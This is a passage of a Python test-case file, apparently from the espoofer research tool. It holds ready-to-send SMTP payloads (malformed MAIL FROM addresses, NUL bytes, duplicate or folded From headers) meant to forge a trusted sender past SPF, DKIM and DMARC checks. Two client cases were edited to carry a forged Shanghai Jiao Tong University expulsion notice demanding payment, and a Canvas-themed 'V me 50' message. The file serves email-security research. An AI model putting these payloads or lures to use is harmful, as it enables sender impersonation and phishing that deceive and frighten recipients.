# -*- coding:utf-8 -*-
from common.common import *
import config

# Important note:
#
# For server mode, all case_id should start with 'server_'.  All of attack.com, admin@legitimate.com, and victim@victim.com in thos cases will be replaced with the configured value in config.py.
# 
# For client mode, all case_id should start with 'client_'. attacker@example.com and admin@example.com in those cases will be replaced.
#

test_cases = {
    "server_a1": {
        "helo": b"helo.attack.com",
        "mailfrom": b"<any@mailfrom.notexist.legitimate.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <admin@legitimate.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: \xe6\x9c\x80\xe6\x96\xb0Canvas\xe9\x80\x9a\xe7\x9f\xa5: GG Bond wants a KFC meal\r\n",
            "body": b"\xe6\x88\x91\xe6\x98\xafGG\xe7\x88\x86, V\xe6\x88\x9150, vx: Krhimself.\r\n\n How can college students not be crazy? V me 50! \r\n How can college students not be crazy? V me 50! \r\n How can college students not be crazy? V me 50! \r\n How can college students not be crazy? V me 50! \r\n How can college students not be crazy? V me 50! \r\n It's Fucking crazy Friday! \r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Non-existent subdomains in MAIL FROM, refer to A1 attack in the paper."
    },
    "server_a2": {
        "helo": b"attack.com",
        "mailfrom": b"<(any@legitimate.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <ceo@legitimate.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A2: empty MAIL FROM address\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Empty MAIL FROM addresses, refer to A2 attack in the paper."
    },
    "server_a3": {
        "helo": b"33.attack.com",
        "mailfrom": b"<any@33.attack.com>",
        "rcptto": b"<victim@victim.com>",
        "dkim_para": {"d":b"legitimate.com", "s":b"selector._domainkey.attack.com.\x00.any", "sign_header": b"From: <admin@legitimate.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A3: NUL ambiguity\r\n",
            "body": b'Hi, this is a test message! Best wishes.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: multipart/alternative; boundary="001a113db9c28077e7054ee99e9c"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"NUL ambiguity, refer to A3 attack in the paper."
    },
    "server_a4": {
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        "dkim_para": {"d":b"legitimate.com'a.attack.com", "s":b"selector", "sign_header": b"From: <admin@legitimate.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A4: DKIM authentication results injection using single quote\r\n",
            "body": b'Hi, this is a test message! Best wishes.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: multipart/alternative; boundary="001a113db9c28077e7054ee99e9c"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"DKIM authentication results injection using single quote, refer to A4 attack in the paper."
    },
    "server_a5": {
        "helo": b"attack.com",
        "mailfrom": b"<any@legitimate.com(a.attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"legitimate.com(.attack.com", "s":b"selector", "sign_header": b"From: <ceo@legitimate.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A5: SPF authentication results injection using parenthese\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"SPF authentication results injection using parenthese, refer to A5 attack in the paper."
    },
    "server_a6": {
        "helo": b"attack.com",
        "mailfrom": b"<any@legitimate.com'@any.attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"legitimate.com(.attack.com", "s":b"selector", "sign_header": b"From: <ceo@legitimate.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A6: SPF authentication results injection 2\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"SPF authentication results injection 2, refer to Figure 5(f) attack in the paper."
    },
    "server_a7": {
        "helo": b"attack.com",
        "mailfrom": b"<@legitimate.com,@any.com:'any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"legitimate.com(.attack.com", "s":b"selector", "sign_header": b"From: <ceo@legitimate.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A7: routing address in mailfrom\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Routing address in MAIL FROM, a variant of A5 attack."
    },

    "server_a8": {
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"legitimate.com(.attack.com", "s":b"selector", "sign_header": b"From: <ceo@legitimate.com>"},
        "data": {
            "from_header": b"From: <first@attack.com>\r\nFrom: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A8: Multiple From headers\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Multiple From header, refer to Figure 6(a) in the paper."
    },

    "server_a9": {
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"legitimate.com(.attack.com", "s":b"selector", "sign_header": b"From: <ceo@legitimate.com>"},
        "data": {
            "from_header": b" From: <first@attack.com>\r\nFrom: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A9: Multiple From headers with preceding space\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Multiple From headers with preceding space, refer to section 5.1 in the paper."
    },
    "server_a10": {
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"legitimate.com(.attack.com", "s":b"selector", "sign_header": b"From: <ceo@legitimate.com>"},
        "data": {
            "from_header": b"From: <first@attack.com>\r\nFrom : <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A10: Multiple From headers with succeeding space\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Multiple From headers with succeeding space, refer to Figure 6(c) in the paper."
    },
    "server_a11": {
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"legitimate.com(.attack.com", "s":b"selector", "sign_header": b"From: <ceo@legitimate.com>"},
        "data": {
            "from_header": b"From\r\n : <first@attack.com>\r\nFrom: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A11: Multiple From headers with folding line\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Multiple From headers with folding line, refer to Figure 6(b) in the paper."
    },
    "server_a12": {
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"legitimate.com(.attack.com", "s":b"selector", "sign_header": b"From: <ceo@legitimate.com>"},
        "data": {
            "from_header": b"From\r\n : <first@attack.com>\r\nn",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A12: From and Sender header ambiguity\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n' + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"From and Sender header ambiguity, refer to Figure 6(d) in the paper."
    },
    "server_a13": {
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"legitimate.com(.attack.com", "s":b"selector", "sign_header": b"From: <ceo@legitimate.com>"},
        "data": {
            "from_header": b"From\r\n : <first@attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A13: From and Resent-From header ambiguity\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Resent-From: <admin@legitimate.com>\r\n' + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"From and Resent-From header ambiguity, refer to section 5.1 in the paper."
    },
    "server_a14": {
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <first@legitimate.com>, <second@attack.com>"},
        "data": {
            "from_header": b"From: <first@attack.com>, <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A14: Multiple address in From header\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <s@sender.legitimate.com>\r\nContent-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Multiple address in From header, refer to Figure 8(a) in the paper."
    },
    "server_a15": { #works on yahoo_web, outlook_web
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"legitimate.com(.attack.com", "s":b"selector", "sign_header": b"From: <ceo@legitimate.com>"},
        "data": {
            "from_header": b"From:" + bs64encode(b"<admin@legitimate.com>")+ b",<second@attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A15: Email address encoding\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <s@sender.legitimate.com>\r\nContent-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Email address encoding, refer to Figure 8(b) in the paper."
    },
    "server_a16": {
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'legitimate.com"=(.attack.com', "s":b"selector", "sign_header": b"From: <any@attack.com>"},
        "data": {
            "from_header": b"From: <@attack.com,@any.com:admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A16: Route portion\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <s@sender.legitimate.com>\r\nContent-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Route portion, refer to Figure 8(c) in the paper."
    },
    "server_a17": {
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'legitimate.com"=(.attack.com', "s":b"selector", "sign_header": b"From: <any@attack.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>\,<second@attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A17: Quoted pair\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <s@sender.legitimate.com>\r\nContent-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Quoted pair, refer to Figure 8(d) in the paper."
    },
    "server_a18": {
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'legitimate.com"=(.attack.com', "s":b"selector", "sign_header": b"From: <any@attack.com>"},
        "data": {
            "from_header": b"From: admin@legitimate.com,<second@attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A18: Specical characters precedence\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <s@sender.legitimate.com>\r\nContent-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Specical characters precedence, refer to Figure 8(e) in the paper."
    },
    "server_a19": {
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'legitimate.com"=(.attack.com', "s":b"selector", "sign_header": b"From: <any@attack.com>"},
        "data": {
            "from_header": b"From: <any@attack.com>admin@legitimate.com\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A19: Display Name and real address parsing inconsistencies\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <s@sender.legitimate.com>\r\nContent-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Display Name and real address parsing inconsistencies, refer to Figure 8(f) in the paper."
    },



    "client_a1": {
        "helo": b"espoofer-MacBook-Pro.local",
        # "helo": b"helo.attack.com",
        "mailfrom": b"<attacker@example.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"legitimate.com(.attack.com", "s":b"selector", "sign_header": b"From: <ceo@legitimate.com>"},
        "data": {
            "from_header": b"From: <attacker@example.com>\r\nFrom: <admin@example.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: \xe6\x9c\x80\xe6\x96\xb0Canvas\xe9\x80\x9a\xe7\x9f\xa5: GG Bond wants a KFC meal\r\n",
            "subject_header": b"\xe9\x80\x80\xe5\xad\xa6\xe9\x80\x9a\xe7\x9f\xa5",
            # "body": b"\xe6\x88\x91\xe6\x98\xafGG\xe7\x88\x86, V\xe6\x88\x9150, vx: Krhimself.\r\n\n How can college students not be crazy? V me 50! \r\n How can college students not be crazy? V me 50! \r\n How can college students not be crazy? V me 50! \r\n How can college students not be crazy? V me 50! \r\n How can college students not be crazy? V me 50! \r\n It's Fucking crazy Friday! \r\n",
            "body": b"\xe6\x8c\x89\xe7\x85\xa7\xe3\x80\x8a\xe4\xb8\x8a\xe6\xb5\xb7\xe4\xba\xa4\xe9\x80\x9a\xe5\xa4\xa7\xe5\xad\xa6\xe6\x9c\xac\xe7\xa7\x91\xe7\x94\x9f\xe7\xae\xa1\xe7\x90\x86\xe8\xa7\x84\xe5\xae\x9a\xe3\x80\x8b\xe7\xac\xac\xe4\xb8\x89\xe5\x8d\x81\xe5\x85\xab\xe6\x9d\xa1\xe7\xac\xac\xef\xbc\x88\xe4\xba\x8c\xef\xbc\x89\xe9\xa1\xb9\xe7\x9a\x84\xe8\xa7\x84\xe5\xae\x9a\xef\xbc\x8c\xe4\xbd\xa0\xe5\xba\x94\xe4\xba\x8e\xe6\x9c\xac\xe5\xad\xa6\xe6\x9c\x9f\xe5\xbc\x80\xe5\xad\xa6\xe4\xb8\xa4\xe5\x91\xa8\xe5\x86\x85 vivo 50\xe3\x80\x82\xe6\x88\xaa\xe6\xad\xa2\xe5\x88\xb0\xe7\x9b\xae\xe5\x89\x8d\xef\xbc\x8c\xe5\xad\xa6\xe6\xa0\xa1\xe6\x9c\xaa\xe6\x94\xb6\xe5\x88\xb0\xe4\xbd\xa0\xe7\x9a\x84 50 \xe3\x80\x82\xe6\x8c\x89\xe7\x85\xa7\xe3\x80\x8a\xe4\xb8\x8a\xe6\xb5\xb7\xe4\xba\xa4\xe9\x80\x9a\xe5\xa4\xa7\xe5\xad\xa6\xe6\x9c\xac\xe7\xa7\x91\xe7\x94\x9f\xe7\xae\xa1\xe7\x90\x86\xe8\xa7\x84\xe5\xae\x9a\xe3\x80\x8b\xe7\xac\xac\xe4\xb8\x89\xe5\x8d\x81\xe5\x85\xab\xe6\x9d\xa1\xe7\xac\xac\xef\xbc\x88\xe4\xba\x94\xef\xbc\x89\xe9\xa1\xb9\xe3\x80\x81\xe7\xac\xac\xe5\x9b\x9b\xe5\x8d\x81\xe5\x9b\x9b\xe6\x9d\xa1\xe7\xac\xac\xef\xbc\x88\xe4\xba\x8c\xef\xbc\x89\xe9\xa1\xb9\xe8\xa7\x84\xe5\xae\x9a\xef\xbc\x8c\xe5\xba\x94\xe4\xba\x88\xe9\x80\x80\xe5\xad\xa6\xef\xbc\x8c\xe5\xad\xa6\xe6\xa0\xa1\xe7\x8e\xb0\xe5\x90\x91\xe4\xbd\xa0\xe5\x8f\x91\xe5\x87\xba\xe9\x80\x80\xe5\xad\xa6\xe5\xa4\x84\xe7\x90\x86\xe9\xa2\x84\xe9\x80\x9a\xe7\x9f\xa5\xe4\xb9\xa6\xe3\x80\x82\r\n\xe8\xaf\xb7\xe5\x9c\xa8\xe6\x94\xb6\xe5\x88\xb0\xe6\x9c\xac\xe9\x80\x9a\xe7\x9f\xa5\xe4\xb9\xa6\xe5\x90\x8e2\xe5\x91\xa8\xe5\x86\x85\xe5\x8a\x9e\xe7\x90\x86\xe5\xa5\xbd\xe9\x80\x80\xe5\xad\xa6\xe5\x92\x8c\xe7\xa6\xbb\xe6\xa0\xa1\xe6\x89\x8b\xe7\xbb\xad\xe3\x80\x82\xe5\xa6\x82\xe4\xbd\xa0\xe5\xaf\xb9\xe6\x9c\xac\xe9\x80\x80\xe5\xad\xa6\xe5\xa4\x84\xe7\x90\x86\xe9\xa2\x84\xe9\x80\x9a\xe7\x9f\xa5\xe4\xb9\xa6\xe6\x9c\x89\xe5\xbc\x82\xe8\xae\xae\xef\xbc\x8c\xe5\x8f\xaf\xe4\xbb\xa5\xe8\x87\xaa\xe6\x94\xb6\xe5\x88\xb0\xe6\x9c\xac\xe9\x80\x9a\xe7\x9f\xa5\xe4\xb9\xa6\xe4\xb9\x8b\xe6\x97\xa5\xe8\xb5\xb75\xe6\x97\xa5\xe5\x86\x85\xef\xbc\x8c\xe5\x90\x91\xe5\xad\xa6\xe9\x99\xa2\xe6\x8f\x90\xe5\x87\xba\xe9\x99\x88\xe8\xbf\xb0\xe3\x80\x81\xe7\x94\xb3\xe8\xbe\xa9\xef\xbc\x8c\xe9\x80\xbe\xe6\x9c\x9f\xe8\xa7\x86\xe4\xb8\xba\xe4\xbd\xa0\xe6\x94\xbe\xe5\xbc\x83\xe6\x9d\x83\xe5\x88\xa9\xe3\x80\x82\xe5\xa6\x82\xe6\xb2\xa1\xe6\x9c\x89\xe5\xbc\x82\xe8\xae\xae\xef\xbc\x8c\xe6\x88\x96\xe8\x80\x85\xe9\x99\x88\xe8\xbf\xb0\xe3\x80\x81\xe7\x94\xb3\xe8\xbe\xa9\xe7\x9a\x84\xe7\x90\x86\xe7\x94\xb1\xe4\xb8\x8d\xe6\x88\x90\xe7\xab\x8b\xef\xbc\x8c\xe8\xaf\xb7\xe4\xbd\xa0\xe5\x9c\xa8\xe8\xa7\x84\xe5\xae\x9a\xe6\x97\xb6\xe9\x97\xb4\xe5\x86\x85\xe5\x8a\x9e\xe7\x90\x86\xe5\xa5\xbd\xe9\x80\x80\xe5\xad\xa6\xe5\x92\x8c\xe7\xa6\xbb\xe6\xa0\xa1\xe6\x89\x8b\xe7\xbb\xad\xe3\x80\x82\xe9\x80\xbe\xe6\x9c\x9f\xe5\xad\xa6\xe6\xa0\xa1\xe5\xb0\x86\xe6\x8c\x89\xe7\x85\xa7\xe3\x80\x8a\xe4\xb8\x8a\xe6\xb5\xb7\xe4\xba\xa4\xe9\x80\x9a\xe5\xa4\xa7\xe5\xad\xa6\xe6\x9c\xac\xe7\xa7\x91\xe7\x94\x9f\xe7\xae\xa1\xe7\x90\x86\xe8\xa7\x84\xe5\xae\x9a\xe3\x80\x8b\xe5\xaf\xb9\xe4\xbd\xa0\xe4\xbd\x9c\xe5\x87\xba\xe9\x80\x80\xe5\xad\xa6\xe5\xa4\x84\xe7\x90\x86\xe5\x86\xb3\xe5\xae\x9a\xe3\x80\x82\r\n\xe7\x89\xb9\xe6\xad\xa4\xe5\x91\x8a\xe7\x9f\xa5\xe3\x80\x82",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Spoofing via an email service account using multiple From headers, refer to section 6.2 in the paper."
        # 使用多个From标头通过电子邮件服务帐户进行欺骗
    },   
    "client_a2": {
        "helo": b"espoofer-MacBook-Pro.local",
        "mailfrom": b"<attacker@example.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <first@legitimate.com>, <second@attack.com>"},
        "data": {
            "from_header": b"From: <attacker@example.com>, <admin@example.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: client A2: Multiple address in From header\r\n",
            "body": b"Hi, this is a test message! Best wishes.\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <s@sender.legitimate.com>\r\nContent-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Spoofing via an email service account using multiple address, refer to section 6.2 in the paper."
        # 通过使用多个地址的电子邮件服务帐户进行欺骗
    },
    "client_a3": {
        "helo": b"espoofer-MacBook-Pro.local",
        "mailfrom": b"<attacker@example.com>",
        # "mailfrom": b"canvas@sjtu.edu.cn",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <first@legitimate.com>, <second@attack.com>"},
        "data": {
            "from_header": b"From: <admin@example.com>\r\n",
            # "from_header": b"From: <admin@example.com>\r\n" + b"Sender: <admin@example.com>\r\n" + b"Sender: 12345678@qq.com\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            # "subject_header": b"Subject: client A3: Spoofing via an email service account\r\n",
            "subject_header": b"Subject: \xe9\x80\x80\xe5\xad\xa6\xe9\x80\x9a\xe7\x9f\xa5",
            # "body": b"Hi, this is a test message! Best wishes.\r\n",
            "body": b"    \xe6\x8c\x89\xe7\x85\xa7\xe3\x80\x8a\xe4\xb8\x8a\xe6\xb5\xb7\xe4\xba\xa4\xe9\x80\x9a\xe5\xa4\xa7\xe5\xad\xa6\xe6\x9c\xac\xe7\xa7\x91\xe7\x94\x9f\xe7\xae\xa1\xe7\x90\x86\xe8\xa7\x84\xe5\xae\x9a\xe3\x80\x8b\xe7\xac\xac\xe4\xb8\x89\xe5\x8d\x81\xe5\x85\xab\xe6\x9d\xa1\xe7\xac\xac\xef\xbc\x88\xe4\xba\x8c\xef\xbc\x89\xe9\xa1\xb9\xe7\x9a\x84\xe8\xa7\x84\xe5\xae\x9a\xef\xbc\x8c\xe4\xbd\xa0\xe5\xba\x94\xe4\xba\x8e\xe6\x9c\xac\xe5\xad\xa6\xe6\x9c\x9f\xe5\xbc\x80\xe5\xad\xa6\xe4\xb8\xa4\xe5\x91\xa8\xe5\x86\x85 vivo 50\xe3\x80\x82\xe6\x88\xaa\xe6\xad\xa2\xe5\x88\xb0\xe7\x9b\xae\xe5\x89\x8d\xef\xbc\x8c\xe5\xad\xa6\xe6\xa0\xa1\xe6\x9c\xaa\xe6\x94\xb6\xe5\x88\xb0\xe4\xbd\xa0\xe7\x9a\x84 50 